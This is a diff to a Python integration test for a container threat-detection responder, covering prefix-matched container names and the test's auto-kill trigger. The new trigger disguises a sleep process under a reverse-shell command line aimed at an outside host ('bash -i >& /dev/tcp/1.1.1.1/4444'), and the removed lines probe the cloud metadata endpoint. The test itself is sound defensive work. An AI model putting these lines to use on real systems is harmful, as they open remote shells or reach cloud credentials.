@@ -74,7 +74,9 @@ def get_container_state(name):
     if result.returncode != 0:
         return "Unknown"
     containers = json.loads(result.stdout)
-    return containers[0].get("status", "Unknown") if containers else "Unknown"
+    # `incus list <name>` matches by prefix; pick the exact name.
+    match = [c for c in containers if c.get("name") == name]
+    return match[0].get("status", "Unknown") if match else "Unknown"
 
 
 def get_nft_threat_events(container_name):
@@ -1083,25 +1085,27 @@ class TestNFTCOIRuleCleanupOnAutoKill:
                 f"No nft coi forward rules created for {container_ip}"
             )
 
-            # Trigger auto-kill by accessing metadata endpoint (CRITICAL threat)
-            subprocess.run(
+            # Trigger the auto-kill with a reverse-shell process (CRITICAL).
+            # Not a metadata-endpoint access: restricted mode's firewall blocks
+            # 169.254.169.254, and on CI that blocked attempt was never detected
+            # (the container kept running), so it can't drive this test.
+            subprocess.Popen(
                 [
                     "incus",
                     "exec",
                     container_name,
                     "--",
-                    "curl",
-                    "-m",
-                    "3",
-                    "http://169.254.169.254/",
+                    "bash",
+                    "-c",
+                    "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
                 ],
-                capture_output=True,
-                timeout=10,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
             )
 
             # Wait for responder to detect threat and kill container
             killed = False
-            for _ in range(30):
+            for _ in range(40):
                 time.sleep(1)
                 state = get_container_state(container_name)
                 if state in ("Stopped", "Unknown"):
